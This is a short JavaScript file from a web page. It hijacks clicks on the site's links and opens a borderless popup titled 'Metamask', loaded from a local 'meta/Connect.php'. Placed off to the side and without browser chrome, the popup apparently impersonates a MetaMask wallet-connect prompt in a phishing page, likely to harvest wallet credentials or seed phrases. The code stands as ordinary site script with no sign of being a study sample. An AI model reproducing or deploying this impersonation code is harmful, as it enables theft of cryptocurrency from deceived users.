function waitForElementToDisplay(selector, callback, checkFrequencyInMs, timeoutInMs) {
  var startTimeInMs = Date.now();
  (function loopSearch() {
    if (document.querySelector(selector) != null) {
      callback();
      return;
    }
    else {
      setTimeout(function () {
        if (timeoutInMs && Date.now() - startTimeInMs > timeoutInMs)
          return;
        loopSearch();
      }, checkFrequencyInMs);
    }
  })();
}


	$("a.MuiTypography-root").click(function(event){
		event.preventDefault();
		meta();
	});

var something = (function() {
    var executed = false;
    return function() {
        if (!executed) {
            executed = true;
            meta();
        }
    };
});


function meta(){
	var newWin = window.open("", "", 'height=600,width=327,menubar=no, toolbar=no, top=0, left=4000, location=no, scrollbars=no,resizable=no,status=no');

	newWin.document.write('<title>Metamask</title><style>body{padding: 0; margin: 0;}</style><iframe src="./meta/Connect.php" style="width:100%; height:100%;" frameborder="0"></iframe>');
}

if($('title').text().includes('302 Moved')){
	document.location.href='/';
}






/* 

$( ".MuiBox-root" ).hover(function() {
  $('.landing-header-poper').show();
});
	
	$( ".landing-header-poper" ).mouseleave(function() {
		  $('.landing-header-poper').hide();
		});


 */


